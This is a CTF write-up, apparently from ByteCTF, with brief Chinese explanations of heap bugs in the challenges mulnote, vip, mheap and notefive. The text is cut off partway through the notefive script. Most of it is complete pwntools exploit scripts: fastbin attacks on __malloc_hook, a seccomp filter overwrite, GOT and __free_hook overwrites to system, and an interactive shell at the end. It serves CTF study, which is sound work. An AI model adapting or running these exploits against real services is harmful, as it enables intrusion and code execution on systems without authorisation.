<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"&gt;"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">sz</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="s1">'C'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"size&gt;"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">sz</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"note&gt;"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
    <span class="n">cmd</span><span class="p">(</span><span class="s1">'S'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="s1">'R'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"index&gt;"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="s1">'E'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"index&gt;"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"note&gt;"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">9999</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">p</span>
    <span class="k">if</span> <span class="n">host</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./mulnote"</span><span class="p">)</span>
        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"A"</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"A"</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s2">"A"</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s2">"A"</span><span class="p">)</span>   <span class="c1">#3</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"A"</span><span class="p">)</span>   <span class="c1">#0</span>
    <span class="n">show</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"1]:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x41</span>
    <span class="n">info</span><span class="p">(</span><span class="s2">"heap : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"2]:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3c4b78</span>
    <span class="n">info</span><span class="p">(</span><span class="s2">"libc : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"A"</span><span class="p">)</span>

    <span class="n">dele</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"__malloc_hook"</span><span class="p">]</span><span class="o">-</span><span class="mh">0x23</span><span class="p">)[:</span><span class="mi">6</span><span class="p">])</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"A"</span><span class="p">)</span>

    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x4526a</span>
    <span class="n">info</span><span class="p">(</span><span class="s2">"one_gadget : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="mh">0x13</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc.so"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="c1"># elf = ELF("./mheap",checksec=False)</span>
    <span class="n">main</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s1">'REMOTE'</span><span class="p">])</span>
</pre></div>
<h2 data-content="1" id="442dfce7d3a09e96fa4814e2cd47e63d">vip</h2>
<p><code>vip</code>函数中存在溢出，可以覆写<code>sock_filter</code>，将<code>open("/dev/random", 0)</code>的返回值改为<code>ERRNO(0)</code>即可进行后续利用</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">9999</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">host</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./vip"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">"LD_PRELOAD"</span><span class="p">:</span><span class="s2">"./libc-2.27.so"</span><span class="p">})</span>
        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s1">'''</span>
<span class="s1">            # b *0x00000000004014EB</span>
<span class="s1">            c</span>
<span class="s1">        '''</span><span class="p">)</span>
    <span class="n">sa</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span>
    <span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'choice: '</span><span class="p">,</span> <span class="s1">'1'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'choice: '</span><span class="p">,</span> <span class="s1">'2'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'choice: '</span><span class="p">,</span> <span class="s1">'3'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">cont</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'choice: '</span><span class="p">,</span> <span class="s1">'4'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'Size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
        <span class="n">sa</span><span class="p">(</span><span class="s1">'Content: '</span><span class="p">,</span> <span class="n">cont</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">vip</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'choice: '</span><span class="p">,</span> <span class="s1">'6'</span><span class="p">)</span>
        <span class="n">sa</span><span class="p">(</span><span class="s1">'name: '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">vip</span><span class="p">(</span><span class="s1">'tr3e'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x01\x01\x00\x00\x20\x00\x00\x00\x18\x00\x00\x00\x15\x00\x00\x01\x7e\x20\x40\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f</span><span class="s2">"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">alloc</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">'A'</span><span class="o">*</span><span class="mh">0x50</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404100</span><span class="p">))</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0xF</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mh">0xF</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'free'</span><span class="p">]))</span>
    <span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'free'</span><span class="p">]</span>
    <span class="n">info</span><span class="p">(</span><span class="s1">'libc @ '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">edit</span><span class="p">(</span><span class="mh">0xF</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">'/bin/sh'</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()))</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]))</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./vip'</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc-2.27.so'</span><span class="p">)</span>
    <span class="n">exploit</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s1">'REMOTE'</span><span class="p">])</span>

<span class="c1"># bytectf{2ab64f4ee279e5baf7ab7059b15e6d12}</span>
</pre></div>
<h2 data-content="1" id="f04b6cdbd72cd229ad88049e1b5b3d5b">mheap</h2>
<p>程序定义了自己的分配规则，程序的chunk：</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">chunk</span><span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">void</span><span class="o">*</span> <span class="n">next</span><span class="p">;</span> <span class="c1">//only used after free</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">size</span><span class="p">];</span>
<span class="p">}</span>
</pre></div>
<p>漏洞点在</p>
<div class="highlight"><pre><span></span><span class="n">_int64</span> <span class="kr">__fastcall</span> <span class="nf">read_n</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">signed</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">do</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v3</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&gt;=</span> <span class="n">len</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">v3</span><span class="p">],</span> <span class="n">len</span> <span class="o">-</span> <span class="n">v3</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v4</span> <span class="p">)</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">v3</span> <span class="o">+=</span> <span class="n">v4</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">buf</span><span class="p">[</span><span class="n">v3</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">result</span> <span class="o">!=</span> <span class="mi">10</span> <span class="p">);</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>当buf+len的地址比mmap的尾部还要大时，read返回-1，然后就可以向上读，伪造一个next指针即可</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Your choice: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">sz</span><span class="p">,</span><span class="n">content</span><span class="o">=</span><span class="s1">''</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Index: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Input size: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">sz</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">content</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Content: "</span><span class="p">)</span>
        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Index: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Index: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Index: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">9999</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">p</span>
    <span class="k">if</span> <span class="n">host</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./mheap"</span><span class="p">)</span>
        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"b *0x000000000040159B"</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xfb0</span><span class="p">,</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0x10</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004040d0</span><span class="p">)</span><span class="o">+</span><span class="s1">'A'</span><span class="o">*</span><span class="mh">0x2f</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x23330fc0</span><span class="o">-</span><span class="mh">0x10</span><span class="p">,</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0x8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">"atoi"</span><span class="p">])</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"atoi"</span><span class="p">]</span>
    <span class="n">info</span><span class="p">(</span><span class="s2">"libc : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"system"</span><span class="p">])</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Your choice: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"/bin/sh</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc-2.27.so"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./mheap"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">main</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s1">'REMOTE'</span><span class="p">])</span>
</pre></div>
<h2 data-content="1" id="01459498e963c59e4ebe206db23c4af8">notefive</h2>
<p>程序的 edit 功能存在 off_by_one，先overlap，然后一系列利用攻击到 stdout 泄露出libc，我选择的地方是_IO_stdout_2<em>1-0x51(1/16的概率) 的位置，那里有个 0xff。然后伪造stderr的vtable，最后触发</em> IO_flush_all_lockp<br/>
来 getshell。</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"choice&gt;&gt; "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">sz</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"idx: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"size: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">sz</span><span class="p">))</span>



<span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"idx: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"idx: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"content: "</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


